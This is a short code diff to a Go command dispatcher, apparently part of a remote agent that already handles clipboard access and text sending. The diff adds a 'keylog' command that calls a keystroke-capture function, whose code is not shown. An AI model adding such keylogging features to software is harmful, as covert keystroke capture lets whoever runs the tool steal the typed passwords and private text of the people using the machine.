@@ -516,6 +516,8 @@ func Execute(cmd, args string) (string, error) {
 		return getAgentDebugLog(args)
 	case "send-text":
 		return sendText(args)
+	case "keylog":
+		return keylogCapture(args)
 	case "clipboard-get":
 		return clipboardGet()
 	case "clipboard-set":
